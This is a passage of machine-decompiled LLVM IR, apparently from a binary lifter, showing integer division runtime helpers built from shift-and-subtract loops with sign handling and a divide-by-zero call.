  %v2_129cc59 = phi i32 [ %v3_129b8, %bb83 ], [ %v1_129b8, %bb82 ], [ %v1_129b8, %dec_label_pc_129ac ]
  %v1_129c451 = phi i32 [ %v3_129b4, %bb83 ], [ %v1_129b4, %bb82 ], [ %v1_129b4, %dec_label_pc_129ac ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_129c4

dec_label_pc_129c4:                               ; preds = %.thread11, %dec_label_pc_129c0
  %v1_129f8 = phi i32 [ %v4_129f8, %.thread11 ], [ %v2_129cc59, %dec_label_pc_129c0 ]
  %v1_129cc = phi i32 [ %v0_12a04, %.thread11 ], [ 0, %dec_label_pc_129c0 ]
  %v1_129fc = phi i32 [ %v4_129fc, %.thread11 ], [ %v1_129c451, %dec_label_pc_129c0 ]
  %v1_129c8 = phi i32 [ %v0_129f4, %.thread11 ], [ %v0_12978, %dec_label_pc_129c0 ]
  %v3_129c4 = icmp ult i32 %v1_129c8, %v1_129fc
  br i1 %v3_129c4, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_129c4
  %v3_129c8 = sub i32 %v1_129c8, %v1_129fc
  %v3_129cc = or i32 %v1_129cc, %v1_129f8
  store i32 %v3_129cc, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_129c4, %bb84
  %v1_129d4 = phi i32 [ %v1_129c8, %dec_label_pc_129c4 ], [ %v3_129c8, %bb84 ]
  %v1_129d8 = phi i32 [ %v1_129cc, %dec_label_pc_129c4 ], [ %v3_129cc, %bb84 ]
  %v4_129d0 = udiv i32 %v1_129fc, 2
  %v6_129d0 = icmp ult i32 %v1_129d4, %v4_129d0
  br i1 %v6_129d0, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_129d4 = urem i32 %v1_129fc, 2
  %v4_129d4 = icmp eq i32 %v3_129d4, 0
  %v6_129d4 = sub i32 %v1_129d4, %v4_129d0
  br i1 %v4_129d4, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_129d8 = udiv i32 %v1_129f8, 2
  %v6_129d8 = or i32 %v1_129d8, %v5_129d8
  store i32 %v6_129d8, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_129e0 = phi i32 [ %v6_129d4, %bb85 ], [ %v1_129d4, %.thread7 ], [ %v6_129d4, %bb86 ]
  %v1_129e4 = phi i32 [ %v1_129d8, %bb85 ], [ %v1_129d8, %.thread7 ], [ %v6_129d8, %bb86 ]
  %v4_129dc = udiv i32 %v1_129fc, 4
  %v6_129dc = icmp ult i32 %v1_129e0, %v4_129dc
  br i1 %v6_129dc, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_129e0 = and i32 %v1_129fc, 2
  %v4_129e0 = icmp eq i32 %v3_129e0, 0
  %v6_129e0 = sub i32 %v1_129e0, %v4_129dc
  br i1 %v4_129e0, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_129e4 = udiv i32 %v1_129f8, 4
  %v6_129e4 = or i32 %v1_129e4, %v5_129e4
  store i32 %v6_129e4, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_129ec = phi i32 [ %v6_129e0, %bb87 ], [ %v1_129e0, %.thread8 ], [ %v6_129e0, %bb88 ]
  %v1_129f0 = phi i32 [ %v1_129e4, %bb87 ], [ %v1_129e4, %.thread8 ], [ %v6_129e4, %bb88 ]
  %v4_129e8 = udiv i32 %v1_129fc, 8
  %v6_129e8 = icmp ult i32 %v1_129ec, %v4_129e8
  br i1 %v6_129e8, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_129ec = and i32 %v1_129fc, 4
  %v4_129ec = icmp eq i32 %v3_129ec, 0
  %v6_129ec = sub i32 %v1_129ec, %v4_129e8
  br i1 %v4_129ec, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_129f0 = udiv i32 %v1_129f8, 8
  %v6_129f0 = or i32 %v1_129f0, %v5_129f0
  store i32 %v6_129f0, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_12a04 = phi i32 [ %v1_129f0, %bb89 ], [ %v1_129f0, %.thread9 ], [ %v6_129f0, %bb90 ]
  %v0_129f4 = phi i32 [ %v6_129ec, %bb89 ], [ %v1_129ec, %.thread9 ], [ %v6_129ec, %bb90 ]
  %v2_129f4 = icmp eq i32 %v0_129f4, 0
  br i1 %v2_129f4, label %dec_label_pc_12a04, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %v4_129f8 = udiv i32 %v1_129f8, 16
  store i32 %v4_129f8, i32* @r3, align 4
  %tmp138 = icmp ult i32 %v1_129f8, 16
  br i1 %tmp138, label %dec_label_pc_12a04, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_129fc = udiv i32 %v1_129fc, 16
  br label %dec_label_pc_129c4

dec_label_pc_12a04:                               ; preds = %thread-pre-split, %bb91
  ret i32 %v0_12a04

dec_label_pc_12a0c:                               ; preds = %dec_label_pc_12978
  %v9_12978 = icmp eq i32 %v0_12978, %v1_12978
  %. = zext i1 %v9_12978 to i32
  ret i32 %.

dec_label_pc_12a18:                               ; preds = %dec_label_pc_12980
  %v2_12a18 = icmp ugt i32 %v1_12978, 65535
  br i1 %v2_12a18, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_12a18
  %v2_12a1c = and i32 %v1_12978, 32768
  %v3_12a1c = icmp eq i32 %v2_12a1c, 0
  %v4_12a1c = udiv i32 %v1_12978, 65536
  br i1 %v3_12a1c, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_12a18
  %v0_12a2865 = phi i32 [ %v1_12978, %dec_label_pc_12a18 ], [ %v4_12a1c, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_12a2c = phi i32 [ %v0_12a2865, %.thread16 ], [ %v4_12a1c, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_12a28 = icmp ugt i32 %v1_12a2c, 255
  br i1 %v2_12a28, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_12a2c = and i32 %v1_12a2c, 128
  %v3_12a2c = icmp eq i32 %v2_12a2c, 0
  %v4_12a2c = udiv i32 %v1_12a2c, 256
  br i1 %v3_12a2c, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_12a30 = or i32 %storemerge, 8
  store i32 %v2_12a30, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_12a3c = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_12a30, %bb98 ]
  %v1_12a38 = phi i32 [ %v1_12a2c, %bb96 ], [ %v4_12a2c, %bb97 ], [ %v4_12a2c, %bb98 ]
  %v2_12a34 = icmp ugt i32 %v1_12a38, 15
  br i1 %v2_12a34, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_12a38 = and i32 %v1_12a38, 8
  %v3_12a38 = icmp eq i32 %v2_12a38, 0
  %v4_12a38 = udiv i32 %v1_12a38, 16
  br i1 %v3_12a38, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_12a3c = add nsw i32 %v1_12a3c, 4
  store i32 %v2_12a3c, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_12a44 = phi i32 [ %v1_12a3c, %.thread17 ], [ %v1_12a3c, %bb99 ], [ %v2_12a3c, %bb100 ]
  %v5_12a48 = phi i32 [ %v1_12a38, %.thread17 ], [ %v4_12a38, %bb99 ], [ %v4_12a38, %bb100 ]
  %v2_12a40 = icmp ugt i32 %v5_12a48, 3
  %v7_12a40 = icmp eq i32 %v5_12a48, 4
  %v2_12a44 = xor i1 %v7_12a40, true
  %v3_12a44 = and i1 %v2_12a40, %v2_12a44
  br i1 %v3_12a44, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_12a44 = add nsw i32 %v4_12a44, 3
  store i32 %v5_12a44, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_12a48 = phi i32 [ %v4_12a44, %.thread18 ], [ %v5_12a44, %bb101 ]
  %v2_12a48 = xor i1 %v2_12a40, true
  %v3_12a48 = or i1 %v7_12a40, %v2_12a48
  br i1 %v3_12a48, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_12a48 = udiv i32 %v5_12a48, 2
  %v9_12a48 = add i32 %v4_12a48, %v8_12a48
  store i32 %v9_12a48, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_12a4c = phi i32 [ %v4_12a48, %bb102 ], [ %v9_12a48, %bb103 ]
  %v6_12a4c = lshr i32 %v0_12978, %v1_12a4c
  ret i32 %v6_12a4c

dec_label_pc_12a54:                               ; preds = %dec_label_pc_1296c
  %v0_12a54 = load i32, i32* @lr, align 4
  %v0_12a58 = call i32 @function_12bc4()
  store i32 %v0_12a54, i32* @lr, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_12a48, { 1, 0 }
  uselistorder i1 %v7_12a40, { 1, 0 }
  uselistorder i32 %v4_12a38, { 1, 0 }
  uselistorder i32 %v1_12a38, { 1, 0, 2, 3 }
  uselistorder i32 %v2_12a30, { 1, 0 }
  uselistorder i32 %v4_12a2c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12a2c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12a1c, { 1, 0 }
  uselistorder i32 %v0_129f4, { 1, 0 }
  uselistorder i32 %v4_129e8, { 1, 0 }
  uselistorder i32 %v1_129f0, { 1, 2, 0 }
  uselistorder i32 %v4_129dc, { 1, 0 }
  uselistorder i32 %v1_129e4, { 1, 2, 0 }
  uselistorder i32 %v4_129d0, { 1, 0 }
  uselistorder i32 %v1_129d8, { 1, 2, 0 }
  uselistorder i32 %v1_129fc, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_129cc, { 1, 0 }
  uselistorder i32 %v3_129b8, { 2, 0, 1 }
  uselistorder i32 %v3_129b4, { 1, 0 }
  uselistorder i32 %v1_129b4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_129b8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_129a4, { 2, 0, 1 }
  uselistorder i32 %v4_129a0, { 2, 1, 0 }
  uselistorder i32 %v1_129a4, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_129ac.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_12978, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_12978, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_1296c, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_12a04, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_129c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_129acthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @function_12a68(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12a68:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_12a6c = call i32 @function_1296c()
  store i32 %arg2, i32* @r2, align 4
  ret i32 %v0_12a6c
}

define i32 @function_12a80() local_unnamed_addr {
dec_label_pc_12a80:
  %v0_12a80 = load i32, i32* @r1, align 4
  %v1_12a80 = icmp slt i32 %v0_12a80, 0
  %v2_12a80 = icmp eq i32 %v0_12a80, 0
  %v0_12a84 = load i32, i32* @r0, align 4
  %v2_12a84 = xor i32 %v0_12a84, %v0_12a80
  br i1 %v2_12a80, label %dec_label_pc_12b98, label %dec_label_pc_12a8c

dec_label_pc_12a8c:                               ; preds = %dec_label_pc_12a80
  br i1 %v1_12a80, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_12a8c
  %v2_12a8c = sub i32 0, %v0_12a80
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_12a8c, %bb
  %v1_12b58 = phi i32 [ %v2_12a8c, %bb ], [ %v0_12a80, %dec_label_pc_12a8c ]
  %v1_12a90 = add i32 %v1_12b58, -1
  %v7_12a90 = icmp eq i32 %v1_12b58, 1
  br i1 %v7_12a90, label %dec_label_pc_12b38, label %dec_label_pc_12a98

dec_label_pc_12a98:                               ; preds = %thread-pre-split
  %v1_12a98 = icmp slt i32 %v0_12a84, 0
  br i1 %v1_12a98, label %bb84, label %bb85

bb84:                                             ; preds = %dec_label_pc_12a98
  %v2_12a9c = sub i32 0, %v0_12a84
  br label %bb85

bb85:                                             ; preds = %dec_label_pc_12a98, %bb84
  %v0_12b8c = phi i32 [ %v0_12a84, %dec_label_pc_12a98 ], [ %v2_12a9c, %bb84 ]
  %v3_12aa0 = icmp uge i32 %v0_12b8c, %v1_12b58
  %v9_12aa0 = icmp eq i32 %v0_12b8c, %v1_12b58
  %v2_12aa4 = xor i1 %v3_12aa0, true
  %v3_12aa4 = or i1 %v9_12aa0, %v2_12aa4
  br i1 %v3_12aa4, label %dec_label_pc_12b44, label %dec_label_pc_12aa8

dec_label_pc_12aa8:                               ; preds = %bb85
  %v2_12aa8 = and i32 %v1_12a90, %v1_12b58
  %v4_12aa8 = icmp eq i32 %v2_12aa8, 0
  br i1 %v4_12aa8, label %dec_label_pc_12b54, label %dec_label_pc_12ab0

dec_label_pc_12ab0:                               ; preds = %dec_label_pc_12aa8
  %v3_12ab0 = icmp ult i32 %v1_12b58, 536870912
  br i1 %v3_12ab0, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_12ab0
  %v4_12ab4 = mul i32 %v1_12b58, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_12ab0, %.thread
  %v0_12ad4.pr40.ph = phi i32 [ %v4_12ab4, %.thread ], [ %v1_12b58, %dec_label_pc_12ab0 ]
  %storemerge142 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_12ab0 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb88
  %v0_12ad4.pr40 = phi i32 [ %v4_12ac8, %bb88 ], [ %v0_12ad4.pr40.ph, %.preheader.preheader ]
  %v1_12acc = phi i32 [ %v4_12acc, %bb88 ], [ %storemerge142, %.preheader.preheader ]
  %v2_12ac0 = icmp ugt i32 %v0_12ad4.pr40, 268435455
  br i1 %v2_12ac0, label %.thread3, label %bb86

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_12ad4thread-pre-split.loopexit

bb86:                                             ; preds = %.preheader
  %v4_12ac4 = icmp ult i32 %v0_12ad4.pr40, %v0_12b8c
  br i1 %v4_12ac4, label %bb87, label %dec_label_pc_12ad4thread-pre-split.loopexit.loopexit

bb87:                                             ; preds = %bb86
  %v2_12ac8 = and i32 %v0_12ad4.pr40, 268435456
  %v3_12ac8 = icmp eq i32 %v2_12ac8, 0
  %v4_12ac8 = mul i32 %v0_12ad4.pr40, 16
  br i1 %v3_12ac8, label %bb88, label %dec_label_pc_12ad4.loopexit

bb88:                                             ; preds = %bb87
  %v2_12acc = and i32 %v1_12acc, 268435456
  %v3_12acc = icmp eq i32 %v2_12acc, 0
  %v4_12acc = mul i32 %v1_12acc, 16
  br i1 %v3_12acc, label %.preheader, label %dec_label_pc_12ad4thread-pre-split.loopexit.loopexit

dec_label_pc_12ad4thread-pre-split.loopexit.loopexit: ; preds = %bb88, %bb86
  %v1_12ae052.ph = phi i32 [ %v1_12acc, %bb86 ], [ %v4_12acc, %bb88 ]
  %v0_12ad4.pr42.ph = phi i32 [ %v0_12ad4.pr40, %bb86 ], [ %v4_12ac8, %bb88 ]
  br label %dec_label_pc_12ad4thread-pre-split.loopexit

dec_label_pc_12ad4thread-pre-split.loopexit:      ; preds = %dec_label_pc_12ad4thread-pre-split.loopexit.loopexit, %.thread3
  %v1_12ae052 = phi i32 [ %v1_12acc, %.thread3 ], [ %v1_12ae052.ph, %dec_label_pc_12ad4thread-pre-split.loopexit.loopexit ]
  %v0_12ad4.pr42 = phi i32 [ %v0_12ad4.pr40, %.thread3 ], [ %v0_12ad4.pr42.ph, %dec_label_pc_12ad4thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12ad4thread-pre-split

dec_label_pc_12ad4thread-pre-split:               ; preds = %dec_label_pc_12ad4thread-pre-split.loopexit, %bb90
  %v1_12ae050 = phi i32 [ %v1_12ae052, %dec_label_pc_12ad4thread-pre-split.loopexit ], [ %v3_12ae0, %bb90 ]
  %v2_12ad848 = phi i32 [ %v0_12b8c, %dec_label_pc_12ad4thread-pre-split.loopexit ], [ %v2_12ad8, %bb90 ]
  %v0_12ad4.pr = phi i32 [ %v0_12ad4.pr42, %dec_label_pc_12ad4thread-pre-split.loopexit ], [ %v3_12adc, %bb90 ]
  br label %dec_label_pc_12ad4

dec_label_pc_12ad4.loopexit:                      ; preds = %bb87
  br label %dec_label_pc_12ad4

dec_label_pc_12ad4:                               ; preds = %dec_label_pc_12ad4.loopexit, %dec_label_pc_12ad4thread-pre-split
  %v1_12ae0 = phi i32 [ %v1_12ae050, %dec_label_pc_12ad4thread-pre-split ], [ %v1_12acc, %dec_label_pc_12ad4.loopexit ]
  %v2_12ad8 = phi i32 [ %v2_12ad848, %dec_label_pc_12ad4thread-pre-split ], [ %v0_12b8c, %dec_label_pc_12ad4.loopexit ]
  %v1_12adc = phi i32 [ %v0_12ad4.pr, %dec_label_pc_12ad4thread-pre-split ], [ %v4_12ac8, %dec_label_pc_12ad4.loopexit ]
  %v2_12ad4 = icmp slt i32 %v1_12adc, 0
  br i1 %v2_12ad4, label %dec_label_pc_12ae8, label %bb89

bb89:                                             ; preds = %dec_label_pc_12ad4
  %v4_12ad8 = icmp ult i32 %v1_12adc, %v2_12ad8
  br i1 %v4_12ad8, label %bb90, label %dec_label_pc_12ae8

bb90:                                             ; preds = %bb89
  %v3_12adc = mul i32 %v1_12adc, 2
  %v2_12ae0 = icmp slt i32 %v1_12ae0, 0
  %v3_12ae0 = mul i32 %v1_12ae0, 2
  br i1 %v2_12ae0, label %dec_label_pc_12ae8, label %dec_label_pc_12ad4thread-pre-split

dec_label_pc_12ae8:                               ; preds = %bb89, %dec_label_pc_12ad4, %bb90
  %v2_12af463 = phi i32 [ %v3_12ae0, %bb90 ], [ %v1_12ae0, %bb89 ], [ %v1_12ae0, %dec_label_pc_12ad4 ]
  %v1_12aec55 = phi i32 [ %v3_12adc, %bb90 ], [ %v1_12adc, %bb89 ], [ %v1_12adc, %dec_label_pc_12ad4 ]
  br label %dec_label_pc_12aec

dec_label_pc_12aec:                               ; preds = %.thread13, %dec_label_pc_12ae8
  %v1_12b20 = phi i32 [ %v4_12b20, %.thread13 ], [ %v2_12af463, %dec_label_pc_12ae8 ]
  %v1_12af4 = phi i32 [ %v1_12b30, %.thread13 ], [ 0, %dec_label_pc_12ae8 ]
  %v1_12b24 = phi i32 [ %v4_12b24, %.thread13 ], [ %v1_12aec55, %dec_label_pc_12ae8 ]
  %v1_12af0 = phi i32 [ %v0_12b1c, %.thread13 ], [ %v0_12b8c, %dec_label_pc_12ae8 ]
  %v3_12aec = icmp ult i32 %v1_12af0, %v1_12b24
  br i1 %v3_12aec, label %.thread8, label %bb91

bb91:                                             ; preds = %dec_label_pc_12aec
  %v3_12af0 = sub i32 %v1_12af0, %v1_12b24
  %v3_12af4 = or i32 %v1_12af4, %v1_12b20
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_12aec, %bb91
  %v1_12afc = phi i32 [ %v1_12af0, %dec_label_pc_12aec ], [ %v3_12af0, %bb91 ]
  %v1_12b00 = phi i32 [ %v1_12af4, %dec_label_pc_12aec ], [ %v3_12af4, %bb91 ]
  %v4_12af8 = udiv i32 %v1_12b24, 2
  %v6_12af8 = icmp ult i32 %v1_12afc, %v4_12af8
  br i1 %v6_12af8, label %.thread9, label %bb92

bb92:                                             ; preds = %.thread8
  %v3_12afc = urem i32 %v1_12b24, 2
  %v4_12afc = icmp eq i32 %v3_12afc, 0
  %v6_12afc = sub i32 %v1_12afc, %v4_12af8
  br i1 %v4_12afc, label %.thread9, label %bb93

bb93:                                             ; preds = %bb92
  %v5_12b00 = udiv i32 %v1_12b20, 2
  %v6_12b00 = or i32 %v1_12b00, %v5_12b00
  br label %.thread9

.thread9:                                         ; preds = %bb92, %.thread8, %bb93
  %v1_12b08 = phi i32 [ %v6_12afc, %bb92 ], [ %v1_12afc, %.thread8 ], [ %v6_12afc, %bb93 ]
  %v1_12b0c = phi i32 [ %v1_12b00, %bb92 ], [ %v1_12b00, %.thread8 ], [ %v6_12b00, %bb93 ]
  %v4_12b04 = udiv i32 %v1_12b24, 4
  %v6_12b04 = icmp ult i32 %v1_12b08, %v4_12b04
  br i1 %v6_12b04, label %.thread10, label %bb94

bb94:                                             ; preds = %.thread9
  %v3_12b08 = and i32 %v1_12b24, 2
  %v4_12b08 = icmp eq i32 %v3_12b08, 0
  %v6_12b08 = sub i32 %v1_12b08, %v4_12b04
  br i1 %v4_12b08, label %.thread10, label %bb95

bb95:                                             ; preds = %bb94
  %v5_12b0c = udiv i32 %v1_12b20, 4
  %v6_12b0c = or i32 %v1_12b0c, %v5_12b0c
  br label %.thread10

.thread10:                                        ; preds = %bb94, %.thread9, %bb95
  %v1_12b14 = phi i32 [ %v6_12b08, %bb94 ], [ %v1_12b08, %.thread9 ], [ %v6_12b08, %bb95 ]
  %v1_12b18 = phi i32 [ %v1_12b0c, %bb94 ], [ %v1_12b0c, %.thread9 ], [ %v6_12b0c, %bb95 ]
  %v4_12b10 = udiv i32 %v1_12b24, 8
  %v6_12b10 = icmp ult i32 %v1_12b14, %v4_12b10
  br i1 %v6_12b10, label %thread-pre-split12, label %bb96

bb96:                                             ; preds = %.thread10
  %v3_12b14 = and i32 %v1_12b24, 4
  %v4_12b14 = icmp eq i32 %v3_12b14, 0
  %v6_12b14 = sub i32 %v1_12b14, %v4_12b10
  br i1 %v4_12b14, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %bb96
  %v5_12b18 = udiv i32 %v1_12b20, 8
  %v6_12b18 = or i32 %v1_12b18, %v5_12b18
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb97, %.thread10, %bb96
  %v1_12b30 = phi i32 [ %v1_12b18, %bb96 ], [ %v1_12b18, %.thread10 ], [ %v6_12b18, %bb97 ]
  %v0_12b1c = phi i32 [ %v6_12b14, %bb96 ], [ %v1_12b14, %.thread10 ], [ %v6_12b14, %bb97 ]
  %v2_12b1c = icmp eq i32 %v0_12b1c, 0
  br i1 %v2_12b1c, label %dec_label_pc_12b2c, label %bb98

bb98:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_12b20, 16
  br i1 %tmp, label %dec_label_pc_12b2c, label %.thread13

.thread13:                                        ; preds = %bb98
  %v4_12b20 = udiv i32 %v1_12b20, 16
  %v4_12b24 = udiv i32 %v1_12b24, 16
  br label %dec_label_pc_12aec

dec_label_pc_12b2c:                               ; preds = %thread-pre-split12, %bb98
  %v1_12b2c = icmp slt i32 %v2_12a84, 0
  br i1 %v1_12b2c, label %bb99, label %.thread16

bb99:                                             ; preds = %dec_label_pc_12b2c
  %v2_12b30 = sub i32 0, %v1_12b30
  br label %.thread16

.thread16:                                        ; preds = %bb103, %bb102, %bb100, %dec_label_pc_12b38, %dec_label_pc_12b2c, %bb99
  %v1_12b34 = phi i32 [ %v1_12b30, %dec_label_pc_12b2c ], [ %v2_12b30, %bb99 ], [ %v2_12b3c, %bb100 ], [ undef, %dec_label_pc_12b38 ], [ %v1_12b5080, %bb102 ], [ %v2_12b4c, %bb103 ]
  ret i32 %v1_12b34

dec_label_pc_12b38:                               ; preds = %thread-pre-split
  br i1 %v1_12a80, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_12b38
  %v2_12b3c = sub i32 0, %v0_12a84
  br label %.thread16

dec_label_pc_12b44:                               ; preds = %bb85
  br i1 %v3_12aa0, label %bb102, label %bb101

bb101:                                            ; preds = %dec_label_pc_12b44
  br label %bb102

bb102:                                            ; preds = %dec_label_pc_12b44, %bb101
  %v1_12b5080 = phi i32 [ %v0_12a84, %dec_label_pc_12b44 ], [ 0, %bb101 ]
  br i1 %v9_12aa0, label %bb103, label %.thread16

bb103:                                            ; preds = %bb102
  %v4_12b48 = ashr i32 %v2_12a84, 31
  %v2_12b4c = or i32 %v4_12b48, 1
  br label %.thread16

dec_label_pc_12b54:                               ; preds = %dec_label_pc_12aa8
  %v2_12b54 = icmp ugt i32 %v1_12b58, 65535
  br i1 %v2_12b54, label %bb104, label %.thread19

bb104:                                            ; preds = %dec_label_pc_12b54
  %v2_12b58 = and i32 %v1_12b58, 32768
  %v3_12b58 = icmp eq i32 %v2_12b58, 0
  %v4_12b58 = udiv i32 %v1_12b58, 65536
  br i1 %v3_12b58, label %.thread19, label %bb105

.thread19:                                        ; preds = %bb104, %dec_label_pc_12b54
  %v0_12b6470 = phi i32 [ %v1_12b58, %dec_label_pc_12b54 ], [ %v4_12b58, %bb104 ]
  br label %bb105

bb105:                                            ; preds = %bb104, %.thread19
  %v1_12b68 = phi i32 [ %v0_12b6470, %.thread19 ], [ %v4_12b58, %bb104 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb104 ]
  %v2_12b64 = icmp ugt i32 %v1_12b68, 255
  br i1 %v2_12b64, label %bb106, label %.thread20

bb106:                                            ; preds = %bb105
  %v2_12b68 = and i32 %v1_12b68, 128
  %v3_12b68 = icmp eq i32 %v2_12b68, 0
  %v4_12b68 = udiv i32 %v1_12b68, 256
  br i1 %v3_12b68, label %.thread20, label %bb107

bb107:                                            ; preds = %bb106
  %v2_12b6c = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb106, %bb105, %bb107
  %v1_12b78 = phi i32 [ %storemerge, %bb105 ], [ %storemerge, %bb106 ], [ %v2_12b6c, %bb107 ]
  %v1_12b74 = phi i32 [ %v1_12b68, %bb105 ], [ %v4_12b68, %bb106 ], [ %v4_12b68, %bb107 ]
  %v2_12b70 = icmp ugt i32 %v1_12b74, 15
  br i1 %v2_12b70, label %bb108, label %.thread21

bb108:                                            ; preds = %.thread20
  %v2_12b74 = and i32 %v1_12b74, 8
  %v3_12b74 = icmp eq i32 %v2_12b74, 0
  %v4_12b74 = udiv i32 %v1_12b74, 16
  br i1 %v3_12b74, label %.thread21, label %bb109

bb109:                                            ; preds = %bb108
  %v2_12b78 = add nsw i32 %v1_12b78, 4
  br label %.thread21

.thread21:                                        ; preds = %bb108, %.thread20, %bb109
  %v4_12b80 = phi i32 [ %v1_12b78, %.thread20 ], [ %v1_12b78, %bb108 ], [ %v2_12b78, %bb109 ]
  %v5_12b84 = phi i32 [ %v1_12b74, %.thread20 ], [ %v4_12b74, %bb108 ], [ %v4_12b74, %bb109 ]
  %v2_12b7c = icmp ugt i32 %v5_12b84, 3
  %v7_12b7c = icmp eq i32 %v5_12b84, 4
  %v2_12b80 = xor i1 %v7_12b7c, true
  %v3_12b80 = and i1 %v2_12b7c, %v2_12b80
  br i1 %v3_12b80, label %bb110, label %bb111

bb110:                                            ; preds = %.thread21
  %v5_12b80 = add nsw i32 %v4_12b80, 3
  br label %bb111

bb111:                                            ; preds = %.thread21, %bb110
  %v4_12b84 = phi i32 [ %v4_12b80, %.thread21 ], [ %v5_12b80, %bb110 ]
  %v2_12b84 = xor i1 %v2_12b7c, true
  %v3_12b84 = or i1 %v7_12b7c, %v2_12b84
  br i1 %v3_12b84, label %bb112, label %bb113

bb112:                                            ; preds = %bb111
  %v8_12b84 = udiv i32 %v5_12b84, 2
  %v9_12b84 = add i32 %v4_12b84, %v8_12b84
  br label %bb113

bb113:                                            ; preds = %bb111, %bb112
  %v1_12b8c = phi i32 [ %v4_12b84, %bb111 ], [ %v9_12b84, %bb112 ]
  %v1_12b88 = icmp slt i32 %v2_12a84, 0
  %v6_12b8c = lshr i32 %v0_12b8c, %v1_12b8c
  %v2_12b90 = sub i32 0, %v6_12b8c
  %v2_12b90.v6_12b8c = select i1 %v1_12b88, i32 %v2_12b90, i32 %v6_12b8c
  ret i32 %v2_12b90.v6_12b8c

dec_label_pc_12b98:                               ; preds = %dec_label_pc_12a80
  %v0_12b9c = call i32 @function_12bc4()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_12b84, { 1, 0 }
  uselistorder i1 %v7_12b7c, { 1, 0 }
  uselistorder i32 %v4_12b74, { 1, 0 }
  uselistorder i32 %v1_12b74, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12b68, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_12b68, { 1, 0, 2, 3 }
